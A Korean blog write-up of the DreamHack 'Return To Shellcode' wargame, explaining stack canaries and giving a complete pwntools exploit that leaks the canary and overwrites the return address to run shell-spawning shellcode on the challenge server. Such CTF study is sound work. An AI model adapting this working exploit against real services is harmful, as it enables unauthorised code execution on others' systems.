---
title:  "[DreamHack] Return To Shellcode 풀이"
categories:
    - Pwnable
tags:
    - dreamhack.io
toc: true
published: true
---
[DreamHack] Return To Shellcode 풀이

# Environments

|Name|Config|
|:---:|:---|
|CPU|Intel Core i7 7700|
|Architecture|Intel64|
|OS|Ubuntu 16.04.7 LTS|
|Tools|- Pwntools|

# Problem
![](/assets/DreamHack/r2s-01.png)
```
Print "Address of the buf: 0x7fff41eb3360"
Print "Distance between buf and $rbp: 96"
Print "[1] Leak the canary"
Print "Input: "
Get Input
Print "Your input is " + Input
Print "`"
Print "[2] Overwrite the return address"
Print "Input: "
Get Input
```

- URL: [dreamhack.io/wargame/challenges/352/](https://dreamhack.io/wargame/challenges/352/)
- 요약: `r2s` 및 서버로부터 Canary Leak을 통해 flag 찾기

# File Format
![](/assets/HCTF/r2s-00.png)

> x86-64 ELF LSB Executable, Not Stripped, Not UPX Packed

# checksec

|Name|Status|
|:---:|:---|
|CANARY|ENABLED|
|FORTIFY|disabled|
|NX|disabled|
|PIE|ENABLED|
|RELRO|FULL|

- Can't overwrite GOT, Canary can leakable

# Solution
Canary Mitgation 과 친숙해지고, 이에 대한 전반적인 이해를 위한 간단한 문제 같다.

![](/assets/DreamHack/r2s-02.png)

우선 같이 첨부된 `r2s.c`가 있으므로 정적 분석 전에 한번 살펴 보기로 하였다. 여기서 알 수 있는 것은 BOF (Buffer OverFlow)가 일어난다는 것과 Buffer의 Size, RBP의 위치를 알려준다는 것이다.

![](/assets/DreamHack/r2s-03.png)

`__stack_chk_fail@plt` 를 통해 Canary Mitgation가 걸려 있는 것을 한번 더 알 수 있다.

![](/assets/DreamHack/r2s-04.png)

BOF를 유도할 경우 위와 같이 Canary Mitgation으로 인하여
```
*** stack smashing detected ***
```
위와 같이 출력 되고 Application 이 종료 된다.

![](/assets/DreamHack/r2s-05.png)

Canary는 Application 실행시 `fs` register로부터 Random 한 값을 받아 해당 값을 Canary 값으로 사용한다. 여기에는 `\n` 이 맨 앞에 포함 된 8바이트 값이 들어간다. 

또한 Canary는 메모리에서 Buffer 영역과 Stack Frame Point (SFP) 사이에 위치한다. 따라서 Buffer 를 BOF 할 경우 Canary 값이 덮어 씌어지게 된다. 이럴 경우 RAO나 BOF 사용이 가능하다.

다행히 아주 간단한 연습 문제인 관계로 Buffer 의 위치, SFP와의 거리가 주어진다. 또한 의심스러운 `0x100` 이 `read` Func 위에 인자로 들어간다. BOF 가 무척 간단 할 것 으로 생각 된다.

![](/assets/DreamHack/r2s-06.png)

사실 이미 위에서 `r2s.c`를 통해 확인 하였지만 재차 확인을 하자면 IDA를 통해 Pseudo Code 확인 결과 추측이 맞았다.

# Exploit Scenario
1. 총 두번의 입력의 BOF를 사용
2. 첫번째 입력으로부터 Canary 값 구하기
3. 두번째 입력으로부터 Return Address를 Overwrite

# Exploit Code
```
from pwn import *
context.log_level   = "DEBUG"
context.arch        = "amd64"

p = remote("host1.dreamhack.games", 20695)

p.recvuntil("buf: ")
buffer = int(p.recvline()[:-1], 16)     # Set buffer from given buffer without \n

p.recvuntil("$rbp: ")                   # Receive Cannary located information
distance = int(p.recvline()[:-1])       # Exclude `\n` byte

payload = "A" * (distance - 7)          # Exclude `\n` byte from Canary
p.sendafter("Input: ", payload)

p.recvuntil(payload)                    # Leaked data from canary
ca = u64(b"\x00" + p.recvn(7))

payload = asm(shellcraft.sh())
payload = payload.ljust(distance-8, b'A') + p64(ca) + b'B'*8 + p64(buffer)

p.sendlineafter("Input: ", payload)
p.interactive()
```

# Result
![](/assets/DreamHack/r2s-07.png)
